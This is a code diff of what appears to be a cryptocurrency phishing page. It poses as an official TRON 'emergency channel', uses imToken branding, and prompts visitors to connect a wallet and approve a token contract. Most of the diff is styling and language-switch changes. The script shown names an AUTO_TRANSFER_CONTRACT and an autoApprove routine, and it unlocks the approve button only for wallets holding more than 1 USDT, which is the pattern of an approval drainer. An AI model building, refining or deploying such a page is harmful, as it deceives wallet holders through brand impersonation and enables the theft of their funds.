@@ -19,81 +19,71 @@
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { 
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    padding: 0; 
+    padding: 0; /* 移除默认padding，避免顶部固定栏偏移 */
     max-width: 600px; 
     margin: 0 auto; 
-    background: #f5f5f5; 
-    color: #333; 
+    background: #f5f5f5; /* 页面整体浅灰背景 */
+    color: #333; /* 全局黑色系字体 */
     min-height: 100vh;
     display: flex;
     flex-direction: column;
     gap: 5px; 
     border-radius: 8px;
-    border-left: 3px solid #dc2626; 
+    border-left: 3px solid #dc2626; /* 保留现有红色边框 */
     font-size: 14px; 
     overflow-x: hidden;
 }
-/* 顶部固定栏 */
+/* 核心修改：顶部栏固定 */
 .header-container {
-    position: fixed; 
-    top: 0; left: 0; right: 0; 
-    max-width: 600px; 
-    margin: 0 auto; 
+    position: fixed; /* 固定顶部 */
+    top: 0; left: 0; right: 0; /* 占满宽度 */
+    max-width: 600px; /* 和页面一致，居中显示 */
+    margin: 0 auto; /* 水平居中 */
     display: flex;
     justify-content: space-between;
-    align-items: center; 
-    padding: 8px 12px; 
-    border-bottom: 1px solid #441a1a; 
-    background: #111; 
-    z-index: 999; 
+    align-items: center; /* 垂直居中元素 */
+    padding: 8px 12px; /* 调整内边距，优化布局 */
+    border-bottom: 1px solid #441a1a; /* 保留现有暗红边框 */
+    background: #111; /* 顶部黑色系底色 */
+    z-index: 999; /* 确保在最上层，不被遮挡 */
     box-sizing: border-box;
 }
-/* 容器内边距（避免被顶部遮挡） */
+/* 核心修改：容器添加顶部内边距，避免被固定顶部栏覆盖 */
 .container {
     flex: 1; 
     display: flex;
     flex-direction: column;
     gap: 5px; 
     overflow-y: auto;
-    padding-top: 70px; 
-    padding-left: 6px; padding-right: 6px; padding-bottom: 10px;
+    padding-top: 70px; /* 等于顶部栏高度+间距，避免内容被挡 */
+    padding-left: 6px; padding-right: 6px; padding-bottom: 10px; /* 保留左右下内边距 */
 }
 .lang-switch {
     padding: 0;
     margin: 0;
     display: flex;
-    flex-direction: row; 
+    flex-direction: row; /* 横向排列，节省空间 */
     align-items: center;
     gap: 8px;
 }
 .lang-text {
-  color: #fff; 
+  color: #fff; /* 顶部白色字体 */
   font-size: 12px;
 }
-/* 核心：下拉框样式（匹配原按钮风格） */
 .lang-toggle {
-    padding: 3px 10px;
-    border: 1px solid #dc2626; 
+    padding: 3px 8px;
+    border: 1px solid #dc2626; /* 保留现有红色边框 */
     border-radius: 20px;
     background: transparent;
-    color: #fff; 
+    color: #fff; /* 顶部白色字体 */
     font-size: 13px;
     cursor: pointer;
-    appearance: none; /* 隐藏原生下拉箭头 */
-    -webkit-appearance: none;
-    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' fill='%23fff'%3E%3Cpath d='M6 8L0 0h12L6 8z'/%3E%3C/svg%3E");
-    background-repeat: no-repeat;
-    background-position: right 8px center;
-    padding-right: 28px; /* 给箭头留空间 */
-    font-family: inherit;
+    display: flex;
+    align-items: center;
+    gap: 4px;
 }
 .lang-toggle:hover {
-    background-color: rgba(220, 38, 38, 0.3); 
-}
-.lang-toggle option {
-    background: #111; /* 下拉选项背景 */
-    color: #fff; 
-    padding: 6px 10px;
+    background: rgba(220, 38, 38, 0.3); /* 保留红色hover背景 */
 }
 .header {
     text-align: left;
@@ -101,7 +91,7 @@ body {
     border-bottom: none;
     margin-bottom: 0;
     display: flex;
-    align-items: center; 
+    align-items: center; /* 垂直居中Logo */
     gap: 10px;
 }
 .header > div {
@@ -110,52 +100,52 @@ body {
     align-items: center;
 }
 .header-logo {
-    width: 130px; 
+    width: 130px; /* 微调Logo宽度，适配固定顶部栏 */
     height: 45px;
     border-radius: 4px;
     object-fit: contain;
 }
 .warning {
-    background: #fff; 
-    color: #333; 
+    background: #fff; /* 白色底色 */
+    color: #333; /* 黑色系字体 */
     padding: 8px;
     border-radius: 8px;
     font-size: 12px;
-    border-left: 3px solid #ef4444; 
+    border-left: 3px solid #ef4444; /* 保留现有亮红边框 */
     line-height: 1.5;
 }
 .warning strong {
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色强调色 */
 }
 #userInfo {
     text-align: center;
     font-size: 12px;
     padding: 12px;
-    background: #fff; 
+    background: #fff; /* 白色底色 */
     border-radius: 8px;
-    border: 1px solid #441a1a; 
+    border: 1px solid #441a1a; /* 保留现有暗红边框 */
     line-height: 1.6;
     min-height: 50px;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
 }
 #userInfo span {
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色高亮文字 */
     font-weight: 500;
 }
 #walletStatusContainer {
-    background: #fff; 
+    background: #fff; /* 白色底色 */
     padding: 12px;
     border-radius: 8px;
-    border: 1px solid #441a1a; 
+    border: 1px solid #441a1a; /* 保留现有暗红边框 */
     font-size: 12px;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
     line-height: 1.6;
-    border-right: 5px solid #ef4444; 
+    border-right: 5px solid #ef4444; /* 保留现有亮红标识边框 */
     min-height: 150px;
 }
 #walletStatusContainer .status-title {
     font-size: 14px;
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色标题 */
     margin-bottom: 6px;
     display: flex;
     align-items: center;
@@ -172,28 +162,28 @@ body {
     display: block;
 }
 #walletStatusContainer .highlight {
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色高亮 */
     font-weight: 500;
 }
 #walletStatusContainer.connected .connected-content .orange-tip {
-    color: #fb923c; 
+    color: #fb923c; /* 保留提示色 */
     margin-top: 5px;
     font-size: 12px;
 }
 #contractResourceContainer {
-    background: #fff; 
+    background: #fff; /* 白色底色 */
     padding: 12px;
     border-radius: 8px;
-    border: 1px solid #441a1a; 
+    border: 1px solid #441a1a; /* 保留现有暗红边框 */
     font-size: 12px;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
     line-height: 1.7;
-    border-bottom: 2px solid rgba(220, 38, 38, 0.3); 
+    border-bottom: 2px solid rgba(220, 38, 38, 0.3); /* 保留现有红色渐变边框 */
     min-height: 80px;
 }
 #contractResourceContainer .status-title {
     font-size: 14px;
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色标题 */
     margin-bottom: 6px;
     display: flex;
     align-items: center;
@@ -201,75 +191,75 @@ body {
 }
 #contractResourceContainer .status-title i {
     font-size: 16px;
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色图标 */
 }
 #contractResourceContainer .highlight {
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色高亮 */
     font-weight: 500;
 }
 #contractResourceContainer .data-tag {
-    background: rgba(220, 38, 38, 0.15); 
+    background: rgba(220, 38, 38, 0.15); /* 保留红色透明背景 */
     padding: 2px 6px;
     border-radius: 4px;
-    border: 1px solid rgba(220, 38, 38, 0.3); 
+    border: 1px solid rgba(220, 38, 38, 0.3); /* 保留红色边框 */
     font-size: 12px;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
 }
 .special-tip-container {
-    background: #fff; 
+    background: #fff; /* 白色底色 */
     padding: 16px;
     border-radius: 8px;
-    border: 1px solid #441a1a; 
+    border: 1px solid #441a1a; /* 保留现有暗红边框 */
     display: none;
     margin-top: 4px;
-    border-right: 3px solid #f97316; 
+    border-right: 3px solid #f97316; /* 保留提示色边框 */
     box-shadow: -2px 0 0 0 #fb923c;
     min-height: 80px;
 }
 .special-tip-title {
     font-size: 16px;
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色标题 */
     font-weight: 600;
     margin-bottom: 6px;
 }
 .special-tip-content {
     font-size: 14px;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
     line-height: 1.7;
     font-weight: 500;
 }
 .record-list {
-    background: #fff; 
+    background: #fff; /* 白色底色 */
     padding: 12px;
     border-radius: 8px;
-    border: 1px solid #441a1a; 
+    border: 1px solid #441a1a; /* 保留现有暗红边框 */
     font-size: 12px;
-    border-right: 5px solid #ef4444; 
+    border-right: 5px solid #ef4444; /* 保留现有亮红标识边框 */
     display: none;
     min-height: 100px;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
 }
 .record-item {
     margin-bottom: 10px;
     padding-bottom: 10px;
-    border-bottom: 1px solid #441a1a; 
+    border-bottom: 1px solid #441a1a; /* 保留现有暗红边框 */
 }
 .record-item:hover {
-    border-color: #ef4444; 
+    border-color: #ef4444; /* 保留红色hover边框 */
     transition: border-color 0.3s;
 }
 .record-item p {
     margin-bottom: 6px;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
     line-height: 1.5;
     font-size: 13px;
 }
 .record-item p strong {
-    color: #333; 
+    color: #333; /* 黑色系强调文字 */
     margin-right: 5px;
 }
 .tx-link {
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色链接 */
     text-decoration: none;
     display: inline-flex;
     align-items: center;
@@ -285,7 +275,7 @@ body {
     gap: 6px;
     margin-top: 4px;
     padding: 6px 0;
-    border-top: 1px solid #441a1a; 
+    border-top: 1px solid #441a1a; /* 保留现有暗红边框 */
 }
 /* 按钮红色调暗 */
 .btn {
@@ -294,8 +284,8 @@ body {
     font-size: 15px;
     border: none;
     border-radius: 8px;
-    background: #b91c1c; 
-    color: white; 
+    background: #b91c1c; /* 调暗后的红色（原#dc2626） */
+    color: white; /* 按钮白色字体 */
     cursor: pointer;
     display: flex;
     align-items: center;
@@ -304,24 +294,24 @@ body {
     transition: background 0.3s;
 }
 .btn:hover {
-    background: #dc2626; 
+    background: #dc2626; /* hover时稍亮，保持过渡 */
 }
 .btn:disabled {
-    background: #441a1a; 
-    color: #666; 
+    background: #441a1a; /* 保留暗红禁用背景 */
+    color: #666; /* 禁用状态灰色字体 */
     cursor: not-allowed;
 }
 .footer-info {
     margin-top: 6px;
     padding-top: 6px;
-    border-top: 1px solid #441a1a; 
+    border-top: 1px solid #441a1a; /* 保留现有暗红边框 */
     font-size: 10px;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
     text-align: center;
     line-height: 1.7;
 }
 .footer-info a {
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色链接 */
     text-decoration: none;
 }
 .footer-info a:hover {
@@ -331,7 +321,7 @@ body {
     text-align: right;
 }
 .review-tip {
-    color: #ef4444; 
+    color: #ef4444; /* 保留红色提示 */
     font-size: 12px;
     margin-top: 6px;
     display: flex;
@@ -345,8 +335,8 @@ body {
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0,0,0,0.85); 
-    z-index: 9999; 
+    background: rgba(0,0,0,0.85); /* 保留深色遮罩 */
+    z-index: 9999; /* 高于顶部栏 */
     display: none;
     align-items: center;
     justify-content: center;
@@ -356,20 +346,20 @@ body {
     display: flex;
 }
 .wallet-modal-content {
-    background: #fff; 
+    background: #fff; /* 白色弹窗底色 */
     border-radius: 12px;
     width: 100%;
     max-width: 400px;
-    border: 1px solid #dc2626; 
+    border: 1px solid #dc2626; /* 保留现有红色边框 */
 }
 .wallet-modal-header {
     padding: 16px;
-    border-bottom: 1px solid #441a1a; 
+    border-bottom: 1px solid #441a1a; /* 保留现有暗红边框 */
     text-align: center;
-    background: #111; 
+    background: #111; /* 弹窗顶部黑色系底色 */
 }
 .wallet-modal-title {
-    color: #fff; 
+    color: #fff; /* 弹窗顶部白色字体 */
     font-size: 18px;
     font-weight: 600;
 }
@@ -384,7 +374,7 @@ body {
     transition: background 0.3s;
 }
 .wallet-item:hover {
-    background: rgba(220, 38, 38, 0.1); 
+    background: rgba(220, 38, 38, 0.1); /* 保留红色hover背景 */
 }
 .wallet-item img {
     width: 36px;
@@ -396,34 +386,34 @@ body {
     flex: 1;
 }
 .wallet-item-name {
-    color: #333; 
+    color: #333; /* 黑色系名称 */
     font-size: 15px;
     font-weight: 500;
 }
 .wallet-item-desc {
-    color: #666; 
+    color: #666; /* 深灰色描述 */
     font-size: 12px;
     margin-top: 2px;
 }
 .wallet-modal-footer {
     padding: 12px 20px;
-    border-top: 1px solid #441a1a; 
+    border-top: 1px solid #441a1a; /* 保留现有暗红边框 */
     text-align: center;
-    color: #333; 
+    color: #333; /* 黑色系字体 */
     font-size: 12px;
 }
-/* 弹窗样式 */
+/* 弹窗样式同步调整 */
 .persistent-alert {
     position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
     padding: 20px 30px; 
-    background: #fff; 
+    background: #fff; /* 白色弹窗底色 */
     border-radius: 8px; 
-    box-shadow: 0 4px 20px rgba(220, 38, 38, 0.4); 
+    box-shadow: 0 4px 20px rgba(220, 38, 38, 0.4); /* 保留红色阴影 */
     font-size: 16px; 
-    color: #333; 
+    color: #333; /* 黑色系字体 */
     z-index: 9999; 
     text-align: center; 
-    border: 1px solid #dc2626; 
+    border: 1px solid #dc2626; /* 保留现有红色边框 */
 }
     </style>
 </head>
@@ -433,15 +423,13 @@ body {
             <div class="header">
                 <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/tron.png" alt="imToken Logo" class="header-logo">
             </div>
-            <!-- 替换原lang-switch部分 -->
-<div class="lang-switch">
-    <span id="headerDesc" class="lang-text">TRON网络官方应急通道</span>
-    <select id="langToggle" class="lang-toggle">
-        <option value="zh" data-flag="🇨🇳">🇨🇳 简体中文</option>
-        <option value="en" data-flag="🇺🇸">🇺🇸 English</option>
-    </select>    
-</div>
-     </div>
+            <div class="lang-switch">
+                <button id="langToggle" class="lang-toggle">
+                  <i class="fa fa-globe"></i>
+                </button>
+                <span id="headerDesc" class="lang-text">TRON网络官方应急通道</span>
+            </div>
+        </div>
         <div id="userInfo">
             <span id="userInfoDefault">未连接钱包<br>
             <span>请点击底部「连接钱包」按钮</span></span>
@@ -897,27 +885,14 @@ function showAutoCloseAlert(message) {
         }
     }, 3000);
 }
-// ========== 语言切换逻辑（下拉框版本） ==========
-let currentLang = localStorage.getItem("TRON_energy_lang") || "zh";
-const langToggle = document.getElementById("langToggle");
-
-// 页面加载时设置默认选中语言+显示对应国旗
-function initLangSelect() {
-    // 选中当前语言
-    langToggle.value = currentLang;
-    // 监听下拉框变化
-    langToggle.addEventListener("change", handleLangChange);
-}
-
-// 下拉框变化时触发语言切换
-function handleLangChange(e) {
-    currentLang = e.target.value;
-    localStorage.setItem("TRON_energy_lang", currentLang);
+// ========== 语言切换逻辑 ==========
+function toggleLang() {
+    currentLang = currentLang === "zh" ? "en" : "zh";
+    localStorage.setItem("imtoken_energy_lang", currentLang);
     updatePageLang();
     reRenderDynamicContent();
     renderEnergyRecords();
 }
-
 function updatePageLang() {
     const lang = langConfig[currentLang];
     Object.keys(lang).forEach(key => {
@@ -930,69 +905,56 @@ function updatePageLang() {
     approveBtn.textContent = lang.approveBtnText;
     reviewTipText.textContent = lang.reviewTipText;
     approvalRecords.textContent = lang.noRecord;
-    // 更新顶部描述文字（根据当前语言）
-    document.getElementById("headerDesc").textContent = lang.headerDesc;
 }
-
-// ========== 页面初始化时调用（替换原toggleLang绑定） ==========
-document.addEventListener('DOMContentLoaded', async () => {
-    localStorage.removeItem("energy_state");
-    contractEnergyEl = document.getElementById("contractEnergy");
-    if (!contractEnergyEl) {
-        showAutoCloseAlert("⚠️ 能量显示元素未找到");
-        return;
-    }
-    
-    startPersistentEnergyCountdown();
-    initLangSelect(); // 初始化语言下拉框
-    updatePageLang();
-    contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
-    renderEnergyRecords();
-    updateWalletStatus();
-    recordList.style.display = "none";
-    const urlWalletType = getWalletFromUrl();
-    if (urlWalletType && walletConfig[urlWalletType]) {
-        localStorage.setItem("selectedWalletType", urlWalletType);
-    }
-    checkImTokenEnv().catch(err => {
-        console.error("环境检测失败：", err);
-        const lang = langConfig[currentLang];
+function reRenderDynamicContent() {
+    const lang = langConfig[currentLang];
+    if (!userAddress) {
         userInfoEl.innerHTML = lang.userInfoDefault;
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
-    });
-    window.addEventListener("beforeunload", () => {
-        if (trxTimer) clearInterval(trxTimer);
-    });
-    if (window.tronWeb && window.location.hash === "#wallet-open") {
-        window.location.hash = "";
-        initWallet(false).catch(err => {
-            console.error("钱包唤起后初始化失败：", err);
-            userInfoEl.innerHTML = `
-                加载失败<br>
-                <span style='color: #ef4444; font-size: 14px;'>${err.message}</span><br>
-                <span style='color: #3b82f6; font-size: 13px;'>点击下方按钮重试</span>
-            `;
-            approveBtn.disabled = false;
-            approveBtn.textContent = lang.retryConnect;
-            approveBtn.onclick = () => initWallet(false);
-        });
+        recordList.style.display = "none";
+        return;
     }
-    if (window.tronWeb && window.location.hash === "#approve") {
-        window.location.hash = "";
-        autoApprove().catch(err => {
-            console.error("授权后初始化失败：", err);
-            userInfoEl.innerHTML = `
-                授权失败<br>
-                <span style='color: #ef4444; font-size: 14px;'>${err.message}</span><br>
-                <span style='color: #3b82f6; font-size: 13px;'>点击下方按钮重试</span>
-            `;
-            approveBtn.disabled = false;
-            approveBtn.textContent = lang.retryConnect;
-            approveBtn.onclick = autoApprove;
-        });
+    recordList.style.display = "block";
+    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+    if (userAddress === SPECIAL_ADDRESS) {
+        userInfoEl.innerHTML = lang.eligibleTip
+            .replace("{address}", shortAddr)
+            .replace("{usdt}", tokenBalance.toFixed(2))
+            .replace("{trx}", trxBalance.toFixed(2));
+        approveBtn.disabled = false;
+        approveBtn.textContent = lang.approveBtnText;
+        document.getElementById("statusAddress").textContent = shortAddr;
+        updateWalletStatus();
+        bindApproveLogic();
+        return;
     }
-});
+    if (isAddressAuthorized(userAddress)) {
+        userInfoEl.innerHTML = lang.authorizedTip
+            .replace("{address}", shortAddr)
+            .replace("{usdt}", tokenBalance.toFixed(2))
+            .replace("{trx}", trxBalance.toFixed(2));
+        approveBtn.disabled = true;
+        approveBtn.textContent = lang.authorizedBtn;
+    } else if (tokenBalance <= 1) {
+        userInfoEl.innerHTML = lang.insufficientUsdt
+            .replace("{address}", shortAddr)
+            .replace("{usdt}", tokenBalance.toFixed(2))
+            .replace("{trx}", trxBalance.toFixed(2));
+        approveBtn.disabled = true;
+        approveBtn.textContent = lang.insufficientBtn;
+    } else {
+        userInfoEl.innerHTML = lang.eligibleTip
+            .replace("{address}", shortAddr)
+            .replace("{usdt}", tokenBalance.toFixed(2))
+            .replace("{trx}", trxBalance.toFixed(2));
+        approveBtn.disabled = false;
+        approveBtn.textContent = lang.approveBtnText;
+    }
+    document.getElementById("statusAddress").textContent = shortAddr;
+    updateWalletStatus();
+    bindApproveLogic();
+}
 // ========== 能量减少逻辑（修复：localStorage存储初始时间，连续不重置） ==========
 let GLOBAL_START_TIME = null; // 动态读取，不固定初始化
 const ENERGY_START_TIME_KEY = "energy_global_start_time"; // 本地存储key
